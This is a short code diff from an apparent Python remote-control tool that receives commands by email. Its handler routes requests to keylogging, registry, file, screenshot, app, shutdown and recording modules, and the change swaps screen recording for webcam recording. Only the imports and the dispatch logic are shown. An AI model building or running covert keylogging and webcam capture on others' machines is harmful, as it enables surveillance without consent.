@@ -6,7 +6,7 @@ from EmailTemplate import EmailTemplate
 from Controls.RegistryControl import RegistryControl 
 from Controls.KeyloggerControl import KeyloggerControl
 from Controls.FileControl import FileControl
-from Controls.ScreenRecordControl import ScreenRecordControl
+from Controls.WebcamRecordControl import WebcamRecordControl
 from Controls.AppProcessServerControl import AppProcessServerControl
 from Controls.ScreenshotControl import ScreenshotControl
 from Controls.ShutdownRestartControl import ShutdownRestartControl
@@ -44,7 +44,7 @@ def HandleRequest(request, emailTemplate):
         LoadParams(request)
 
         if( method != "KEYLOG"
-            and method != "SCREENRECORD"
+            and method != "WEBCAMRECORD"
             and method != "DIRECTORY"
             and method != "REGISTRY"
             and method != "SCREENSHOT"
@@ -63,8 +63,8 @@ def HandleRequest(request, emailTemplate):
             return FileControl.FileHandle(data, fileAttachment)
         if(method == "REGISTRY"):
             return RegistryControl.RegistryHandle(data)
-        if(method == "SCREENRECORD"):
-            return ScreenRecordControl.Handle(emailTemplate)
+        if(method == "WEBCAMRECORD"):
+            return WebcamRecordControl.Handle(emailTemplate)
         if(method == "SCREENSHOT"):
             return ScreenshotControl.Handle()
         if(method == "APPS"):
